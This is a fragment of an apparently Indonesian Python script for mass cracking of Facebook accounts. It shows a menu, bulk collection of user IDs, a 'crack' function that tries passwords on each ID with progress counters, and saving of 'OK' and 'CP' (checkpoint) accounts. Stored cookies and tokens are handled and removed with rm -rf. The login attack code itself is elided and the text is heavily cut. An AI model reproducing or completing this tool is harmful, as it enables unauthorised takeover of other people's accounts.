...
def menu(my_name,my_id):
	...
	print(f'{P}=•=•=•=•=•=•=•=•=•=•=•=•=•=•=•=•=•=•=•=•=•=•=•=•=•=•') 
	wa.print(f'[red]  ➤ [white]Your Name : [r hot_pink2]{my_name}') 
	wa.print(f'[red]  ➤ [white]Your Idz  : [r hot_pink2]{my_id}') 
	print(f'{P}=•=•=•=•=•=•=•=•=•=•=•=•=•=•=•=•=•=•=•=•=•=•=•=•=•=•') 
	print('')
	...
	if Raf_Mkz in ['1']:
		...
		os.system('rm -rf .cok.txt && rm -rf  .token.txt') 
		wa.print(f'[white][[green]√[white]] [green]Succes Remove Cookie And Exit For Script') 
	else :
...
def dump_massal():
	...
	try:
		print('') 
		jum = int(input(f'{k}➪ {P}Mau Berapa ID ? : {h} '))
	except ValueError:
	...
	for met in range(jum):
		yz+=1
		kl = input(f'{k} ➪ {P}Masukkan Id Ke '+str(yz)+f' : {h}')
		uid.append(kl)
	for userr in uid:
		try:
	...
	try:
		#print('')
		wa.print(f'[dim] √  Total Id Terkumpul [green]'+str(len(id)))
		setting()
	except requests.exceptions.ConnectionError:
		print(f'{x}')
...
def passwrd():
	print('') 
	wa.print(f'[green]➤ [white]Akun [green]OK [white]Save In : [green]{okc}') 
	wa.print(f'[yellow]➤ [white]Akun [yellow]CP [white]Save In : [yellow]{cpc}') 
...
def crack(idf,pwv):
	...
	sys.stdout.write(f"\r[SMBRF] {bo}[{idf}] - {P}[{b}{loop}{P}/{u}{len(id)}{P}]—{P}[{H}{ok}{P}]—{P}[{k}{cp}{x}]—[{bo}{'{:.0%}'.format(loop/float(len(id)))}{P}]  "),
	sys.stdout.flush()
	rr = random.randint
